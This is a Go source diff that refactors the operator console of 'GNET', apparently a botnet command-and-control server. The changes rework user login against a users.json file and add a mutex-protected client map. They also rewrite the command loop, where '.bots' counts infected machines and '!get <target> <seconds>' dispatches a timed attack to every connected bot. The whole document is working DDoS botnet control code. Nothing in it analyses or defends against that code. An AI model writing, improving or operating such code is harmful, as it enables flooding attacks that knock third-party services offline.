@@ -3,7 +3,6 @@ package client
 import (
 	"bufio"
 	"encoding/json"
-	"fmt"
 	"gnet/art"
 	"gnet/bot"
 	"gnet/cmds"
@@ -11,8 +10,7 @@ import (
 	"os"
 	"strconv"
 	"strings"
-
-	"github.com/chzyer/readline"
+	"sync"
 )
 
 type Client struct {
@@ -26,152 +24,130 @@ type User struct {
 	Pass string `json:"pass"`
 }
 
-var Clients []Client
+var (
+	Clients   = make(map[net.Conn]Client)
+	ClientsMu sync.RWMutex
+)
 
-func WriterBanner(BannerWriter bufio.Writer) {
-
-	BannerScanner := bufio.NewScanner(strings.NewReader(art.BANNER))
-
-	for BannerScanner.Scan() {
-		BannerWriter.WriteString(fmt.Sprint("\r\033[35m", BannerScanner.Text(), "\n\033[0m"))
+func WriterBanner(Writer *bufio.Writer) {
+	Scanner := bufio.NewScanner(strings.NewReader(art.BANNER))
+	for Scanner.Scan() {
+		Writer.WriteString("\r\033[35m" + Scanner.Text() + "\r\n\033[0m")
 	}
-
-	BannerWriter.WriteString("\n")
-	BannerWriter.Flush()
-
+	Writer.WriteString("\r\n")
+	Writer.Flush()
 }
 
-func GetClientByConnection(Connection net.Conn) Client {
-
-	for _, Client := range Clients {
-		if Client.Conn == Connection {
-			return Client
-		}
-	}
-
-	return Client{}
+func GetClientByConnection(Connection net.Conn) (Client, bool) {
+	ClientsMu.RLock()
+	defer ClientsMu.RUnlock()
+	Client, ok := Clients[Connection]
+	return Client, ok
 }
 
-func ClientLoginHandler(Connection net.Conn) {
-
-	for _, ConnectingClient := range Clients {
-		if ConnectingClient.Conn == Connection {
-			go ClientHandler(Connection)
-			return
-		}
-	}
-
-	Writer := bufio.NewWriter(Connection)
-	Output := ""
-
-	for {
-
-		Writer.WriteString("\033[2J\033[H")
-		Writer.Flush()
-		WriterBanner(*Writer)
-
-		if Output != "" {
-			Writer.WriteString(fmt.Sprint("\r", Output, "\n"))
-		}
-
-		ReadLine, _ := readline.NewEx(&readline.Config{
-			Prompt: fmt.Sprint("\r\033[35m", fmt.Sprintf(art.USER, "login"), "\033[0m "),
-			Stdin:  Connection,
-			Stdout: Connection,
-		})
-
-		Writer.Flush()
-		Text, _ := ReadLine.Readline()
-
-		if len(strings.Split(Text, ":")) == 2 {
-
-			if _, ERR := os.Stat("./data/users.json"); ERR == nil {
-
-				if Content, ERR := os.ReadFile("./data/users.json"); ERR == nil {
-
-					USERNAME := strings.Split(Text, ":")[0]
-					PASSWORD := strings.Split(Text, ":")[1]
-
-					var Accounts []User
-					ERR = json.Unmarshal(Content, &Accounts)
-
-					if ERR == nil {
-						for _, Account := range Accounts {
-							if Account.User == USERNAME && Account.Pass == PASSWORD {
-								Output = "succcess"
-								Clients = append(Clients, Client{User: USERNAME, Conn: Connection, Addr: Connection.RemoteAddr().String()})
-								go ClientLoginHandler(Connection)
-								return
-							}
-						}
-					}
-					Output = "Wrong username or password."
-				}
-				Output = "Backend file error."
-			}
-			Output = "Backend file error."
-		}
-		Output = "Must be in format - user:pass"
-	}
-
+func RemoveClient(Connection net.Conn) {
+	ClientsMu.Lock()
+	delete(Clients, Connection)
+	ClientsMu.Unlock()
 }
 
 func ClientHandler(Connection net.Conn) {
+	defer Connection.Close()
+	defer RemoveClient(Connection)
 
+	Reader := bufio.NewScanner(Connection)
 	Writer := bufio.NewWriter(Connection)
-	Client := GetClientByConnection(Connection)
-	Output := ""
 
-	if Client.User == "" {
-		go ClientLoginHandler(Connection)
+	Writer.WriteString("\033[2J\033[H")
+	WriterBanner(Writer)
+	Writer.WriteString("\033[35mlogin (user:pass)\033[0m\r\n> ")
+	Writer.Flush()
+
+	if !Reader.Scan() {
 		return
 	}
 
+	Parts := strings.Split(strings.TrimSpace(Reader.Text()), ":")
+	if len(Parts) != 2 {
+		return
+	}
+
+	Content, err := os.ReadFile("./data/users.json")
+	if err != nil {
+		return
+	}
+
+	var Accounts []User
+	if json.Unmarshal(Content, &Accounts) != nil {
+		return
+	}
+
+	Username := Parts[0]
+	Password := Parts[1]
+	Valid := false
+
+	for _, Acc := range Accounts {
+		if Acc.User == Username && Acc.Pass == Password {
+			Valid = true
+			break
+		}
+	}
+
+	if !Valid {
+		return
+	}
+
+	ClientsMu.Lock()
+	Clients[Connection] = Client{
+		User: Username,
+		Conn: Connection,
+		Addr: Connection.RemoteAddr().String(),
+	}
+	ClientsMu.Unlock()
+
+	Output := ""
+
 	for {
-
-		Writer.Flush()
 		Writer.WriteString("\033[2J\033[H")
-		Writer.Flush()
-		WriterBanner(*Writer)
-		Writer.WriteString("\r\033[35m| GNET V1.0.0 | .help | \n\033[0m")
-
+		WriterBanner(Writer)
+		Writer.WriteString("\033[35m| GNET V1.0.0 | .help |\033[0m\r\n")
 		if Output != "" {
-			Writer.WriteString("\n")
-			OutputScanner := bufio.NewScanner(strings.NewReader(Output))
-			for OutputScanner.Scan() {
-				Writer.WriteString(fmt.Sprint("\r\033[35m", OutputScanner.Text(), "\033[0m\n"))
-			}
-			Writer.Flush()
+      Scanner := bufio.NewScanner(strings.NewReader(Output))
+    	for Scanner.Scan() {
+    		Writer.WriteString("\r\033[35m" + Scanner.Text() + "\r\n\033[0m")
+    	}
+    	Writer.WriteString("\r\n")
+    	Writer.Flush()
 		}
-
-		Writer.WriteString("\n")
-
-		ReadLine, _ := readline.NewEx(&readline.Config{
-			Prompt: fmt.Sprint("\r\033[35m", fmt.Sprintf(art.USER, Client.User), "\033[0m "),
-			Stdin:  Connection,
-			Stdout: Connection,
-		})
-
+		Writer.WriteString("\033[35m" + Username + "> \033[0m")
 		Writer.Flush()
-		Command, _ := ReadLine.Readline()
 
-		// Command Handler Section
+		if !Reader.Scan() {
+			return
+		}
 
-		if Command == ".help" {
+		Command := strings.TrimSpace(Reader.Text())
+		Output = ""
+
+		switch Command {
+		case ".help":
 			Output = cmds.Help()
-		}
-
-		if Command == ".methods" {
+		case ".methods":
 			Output = cmds.Methods()
+		case ".bots":
+			Output = "[GNET] - " + strconv.Itoa(bot.GetBots()) + " bots"
+		case ".clear":
+			Output = ""
+			continue
 		}
 
-		if Command == ".bots" {
-			BOT_COUNT := strconv.Itoa(bot.GetBots())
-			Output = "\r\033[35m[GNET] - " + BOT_COUNT + " bots\033[0m"
-		}
-
-		if len(strings.Split(Command, " ")) >= 2 {
-			go bot.SendCommandToBots(Command)
+		Parts := strings.Split(Command, " ")
+		if len(Parts) == 3 && Parts[0] == "!get" {
+			Seconds, err := strconv.Atoi(Parts[2])
+			if err == nil {
+				go bot.SendCommandToBots(Command)
+				Output = "[GNET] - " + Parts[1] + " " + strconv.Itoa(Seconds) + " seconds ATK offloaded to " + strconv.Itoa(bot.GetBots()) + " bots"
+			}
 		}
 	}
 }
